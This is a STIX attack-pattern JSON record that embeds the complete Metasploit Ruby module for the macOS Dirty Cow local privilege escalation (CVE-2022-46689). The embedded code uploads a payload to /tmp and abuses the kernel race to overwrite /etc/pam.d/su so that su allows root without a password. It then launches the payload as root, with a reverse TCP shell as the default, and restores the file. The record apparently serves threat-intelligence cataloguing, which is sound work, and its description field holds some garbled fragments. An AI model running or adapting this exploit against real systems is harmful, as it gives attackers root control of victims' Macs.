{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66cbbdab-1a5b-4e36-af60-26359c2c5db9",
    "created": "2024-08-14T16:34:52.800408Z",
    "modified": "2024-08-14T16:34:52.800412Z",
    "name": "macOS Dirty Cow Arbitrary File Write Local Privilege Escalation",
    "description": " An app may be able to execute arbitrary code with kernel privileges  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/mac_dirty_cow.rb",
            "external_id": "mac_dirty_cow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-46689"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/zhuowei/MacDirtyCowDemo"
        },
        {
            "source_name": "exploit_exe=exploit_dataCVE-2022-46689",
            "external_id": "exploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'macOS Dirty Cow Arbitrary File Write Local Privilege Escalation',\n        'Description' => %q{\n          An app may be able to execute arbitrary code with kernel privileges\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ian Beer', # discovery\n          'Zhuowei Zhang', # proof of concept\n          'timwr' # metasploit integration\n        ],\n        'References' => [\n          ['CVE', '2022-46689'],\n          ['URL', 'https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c'],\n          ['URL', 'https://github.com/zhuowei/MacDirtyCowDemo'],\n        ],\n        'Platform' => 'osx',\n        'Arch' => ARCH_X64,\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/shell_reverse_tcp' },\n        'Targets' => [\n          [ 'Mac OS X x64 (Native Payload)', {} ],\n        ],\n        'DisclosureDate' => '2022-12-17',\n        'Notes' => {\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE]\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('TargetFile', [ true, 'The pam.d file to overwrite', '/etc/pam.d/su' ]),\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def check\n    version = Rex::Version.new(get_system_version)\n    if version > Rex::Version.new('13.0.1')\n      CheckCode::Safe\n    elsif version < Rex::Version.new('13.0') && version > Rex::Version.new('12.6.1')\n      CheckCode::Safe\n    elsif version < Rex::Version.new('10.15')\n      CheckCode::Safe\n    else\n      CheckCode::Appears\n    end\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    payload_file = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    binary_payload = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n    upload_and_chmodx payload_file, binary_payload\n    register_file_for_cleanup payload_file\n\n    target_file = datastore['TargetFile']\n    current_content = read_file(target_file)\n    backup_file = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    unless write_file(backup_file, current_content)\n      fail_with Failure::BadConfig, \"#{backup_file} is not writable\"\n    end\n    register_file_for_cleanup backup_file\n\n    replace_content = current_content.sub('rootok', 'permit')\n\n    replace_file = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    unless write_file(replace_file, replace_content)\n      fail_with Failure::BadConfig, \"#{replace_file} is not writable\"\n    end\n    register_file_for_cleanup replace_file\n\n    exploit_file = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    exploit_exe = exploit_data 'CVE-2022-46689', 'exploit'\n    upload_and_chmodx exploit_file, exploit_exe\n    register_file_for_cleanup exploit_file\n\n    exploit_cmd = \"#{exploit_file} #{target_file} #{replace_file}\"\n    print_status(\"Executing exploit '#{exploit_cmd}'\")\n    result = cmd_exec(exploit_cmd)\n    print_status(\"Exploit result:\\n#{result}\")\n\n    su_cmd = \"echo '#{payload_file} & disown' | su\"\n    print_status(\"Running cmd:\\n#{su_cmd}\")\n    result = cmd_exec(su_cmd)\n    unless result.blank?\n      print_status(\"Command output:\\n#{result}\")\n    end\n\n    exploit_cmd = \"#{exploit_file} #{target_file} #{backup_file}\"\n    print_status(\"Executing exploit (restoring) '#{exploit_cmd}'\")\n    result = cmd_exec(exploit_cmd)\n    print_status(\"Exploit result:\\n#{result}\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2022-12-17",
    "x_mitre_platforms": [
        "osx'"
    ]
}